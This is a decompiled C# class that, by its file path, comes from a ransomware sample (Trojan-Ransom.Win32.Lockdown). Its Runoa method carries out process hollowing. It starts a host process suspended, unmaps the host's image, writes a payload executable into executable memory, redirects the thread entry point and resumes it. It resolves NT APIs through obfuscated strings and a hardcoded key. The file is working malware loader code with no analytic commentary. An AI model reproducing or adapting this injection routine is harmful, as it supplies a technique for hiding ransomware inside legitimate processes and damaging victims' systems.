// Decompiled with JetBrains decompiler
// Type: fQxuTtw.Memex
// Assembly: w3cschools, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8B4F2215-C995-4D30-A696-23B90444E6B9
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Lockdown.d-2160436077daf6f63cb09072b3c7e1d7a6b32372032ebc76ebed5892946c2ed1.exe

using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;

namespace fQxuTtw
{
  public class Memex
  {
    private const uint CONTEXT_FULL = 65543;
    private const int CREATE_SUSPENDED = 4;
    private const int MEM_COMMIT = 4096;
    private const int MEM_RESERVE = 8192;
    private const int PAGE_EXECUTE_READWRITE = 64;
    private const ushort IMAGE_DOS_SIGNATURE = 23117;
    private const uint IMAGE_NT_SIGNATURE = 17744;
    public static string pass = "&(%$!(#%%''#''$)$!(!)$!$&";
    private static ClaZx.igQiXSlVkUiZ NTW1;
    private static ClaZx.pBhpkEzwcPDh VA1;
    private static ClaZx.JywoSMKsxxae NTU1;
    private static ClaZx.jzNRdJaAITlI NTG1;
    private static ClaZx.tDVuAiMQBdge NTS1;
    private static ClaZx.OrykDIXOqwes NTR1;
    private static byte[] IMAGE_SECTION_HEADER = new byte[40];
    private static byte[] IMAGE_NT_HEADERS = new byte[248];
    private static byte[] IMAGE_DOS_HEADER = new byte[64];
    private static int[] PROCESS_INFO = new int[4];
    private static byte[] CONTEXT35 = new byte[716];

    public static void CLOZ()
    {
      ResourceManager resourceManager = new ResourceManager("iWotQnkbds", Assembly.GetExecutingAssembly());
      ClaZx.namenorm = resourceManager.GetString("QQSyymE");
      ClaZx.namenet = resourceManager.GetString("zmJjLSQ");
      ClaZx.eofstr = resourceManager.GetString("WYFGLiV");
      ClaZx.otfiles = resourceManager.GetString("EBqrkbZ");
      ClaZx.downex = resourceManager.GetString("aPGshKg");
      ClaZx.visitwebsites = resourceManager.GetString("xBrOYwC");
      ClaZx.startupstring = resourceManager.GetString("gdqnbVi");
      ClaZx.ExtraSt = resourceManager.GetString("RSNimAl");
    }

    public static byte[] BBB(string s) => Encoding.Default.GetBytes(s);

    public static string CCC(string s)
    {
      s = Encoding.Default.GetString(ClaZx.enCode(Memex.BBB(s), Memex.BBB(Memex.pass)));
      return s;
    }

    public static void ZOL() => ClaZx.obj = (object) Marshal.GetDelegateForFunctionPointer(ClaZx.Gepoad, ClaZx.Teaz);

    public static void setDynamics()
    {
      if (!(Memex.pass != ClaZx.extrastrings[0]))
        return;
      Memex.setDynamics2(ClaZx.extrastrings[0], ClaZx.extrastrings[1], ClaZx.extrastrings[2], ClaZx.extrastrings[3], ClaZx.extrastrings[4], ClaZx.extrastrings[5], ClaZx.extrastrings[6], ClaZx.extrastrings[7]);
    }

    private static void setDynamics2(
      string ntdll,
      string kern,
      string Writevirtual,
      string valloc,
      string Viewofsec,
      string GetThC,
      string SetThC,
      string ResumeT)
    {
      Memex.NTW1 = ClaZx.CreateAPI<ClaZx.igQiXSlVkUiZ>(ntdll, Writevirtual);
      Memex.VA1 = ClaZx.CreateAPI<ClaZx.pBhpkEzwcPDh>(kern, valloc);
      Memex.NTU1 = ClaZx.CreateAPI<ClaZx.JywoSMKsxxae>(ntdll, Viewofsec);
      Memex.NTG1 = ClaZx.CreateAPI<ClaZx.jzNRdJaAITlI>(ntdll, GetThC);
      Memex.NTS1 = ClaZx.CreateAPI<ClaZx.tDVuAiMQBdge>(ntdll, SetThC);
      Memex.NTR1 = ClaZx.CreateAPI<ClaZx.OrykDIXOqwes>(ntdll, ResumeT);
    }

    public static unsafe bool Runoa(byte[] exeBuffer, string hostProcess)
    {
      Memex.setDynamics();
      fixed (byte* numPtr = &Memex.IMAGE_SECTION_HEADER[0])
        ;
      fixed (byte* numPtr = &Memex.IMAGE_NT_HEADERS[0])
        ;
      fixed (byte* numPtr = &Memex.IMAGE_DOS_HEADER[0])
        ;
      fixed (byte* lpContext = &Memex.CONTEXT35[0])
        ;
      // ISSUE: fixed variable is out of scope
      *(int*) lpContext = 65543;
      ClaZx.Arraycopy(exeBuffer, 0, Memex.IMAGE_DOS_HEADER);
      // ISSUE: fixed variable is out of scope
      if (*(ushort*) numPtr != (ushort) 23117)
        return false;
      // ISSUE: fixed variable is out of scope
      int toint = *(int*) (numPtr + 60);
      ClaZx.Arraycopy(exeBuffer, toint, Memex.IMAGE_NT_HEADERS);
      // ISSUE: fixed variable is out of scope
      if (*(uint*) numPtr != 17744U || !ClaZx.CreateProcess((string) null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, new byte[68], Memex.PROCESS_INFO))
        return false;
      // ISSUE: fixed variable is out of scope
      IntPtr num1 = new IntPtr(*(int*) (numPtr + 52));
      int num2 = (int) Memex.NTU1((IntPtr) Memex.PROCESS_INFO[0], num1);
      // ISSUE: fixed variable is out of scope
      if (Memex.VA1((IntPtr) Memex.PROCESS_INFO[0], num1, *(uint*) (numPtr + 80), 12288U, 64U) == IntPtr.Zero)
        Memex.Runoa(exeBuffer, hostProcess);
      fixed (byte* lpBuffer = &exeBuffer[0])
      {
        // ISSUE: fixed variable is out of scope
        int num3 = Memex.NTW1((IntPtr) Memex.PROCESS_INFO[0], num1, (IntPtr) (void*) lpBuffer, *(uint*) (numPtr + 84), IntPtr.Zero);
      }
      // ISSUE: fixed variable is out of scope
      for (ushort index = 0; (int) index < (int) *(ushort*) (numPtr + 6); ++index)
      {
        ClaZx.Arraycopy(exeBuffer, toint + Memex.IMAGE_NT_HEADERS.Length + Memex.IMAGE_SECTION_HEADER.Length * (int) index, Memex.IMAGE_SECTION_HEADER);
        // ISSUE: fixed variable is out of scope
        fixed (byte* lpBuffer = &exeBuffer[(IntPtr) *(uint*) (numPtr + 20)])
        {
          // ISSUE: fixed variable is out of scope
          // ISSUE: fixed variable is out of scope
          int num4 = Memex.NTW1((IntPtr) Memex.PROCESS_INFO[0], (IntPtr) ((long) (int) num1 + (long) *(uint*) (numPtr + 12)), (IntPtr) (void*) lpBuffer, *(uint*) (numPtr + 16), IntPtr.Zero);
        }
      }
      // ISSUE: fixed variable is out of scope
      int num5 = Memex.NTG1((IntPtr) Memex.PROCESS_INFO[1], (IntPtr) (void*) lpContext);
      // ISSUE: fixed variable is out of scope
      int num6 = Memex.NTW1((IntPtr) Memex.PROCESS_INFO[0], (IntPtr) (long) *(uint*) (lpContext + 172), num1, 4U, IntPtr.Zero);
      // ISSUE: fixed variable is out of scope
      // ISSUE: fixed variable is out of scope
      *(int*) (lpContext + 176) = (int) num1 + (int) *(uint*) (numPtr + 40);
      // ISSUE: fixed variable is out of scope
      int num7 = Memex.NTS1((IntPtr) Memex.PROCESS_INFO[1], (IntPtr) (void*) lpContext);
      int num8 = (int) Memex.NTR1((IntPtr) Memex.PROCESS_INFO[1], IntPtr.Zero);
      return true;
    }
  }
}
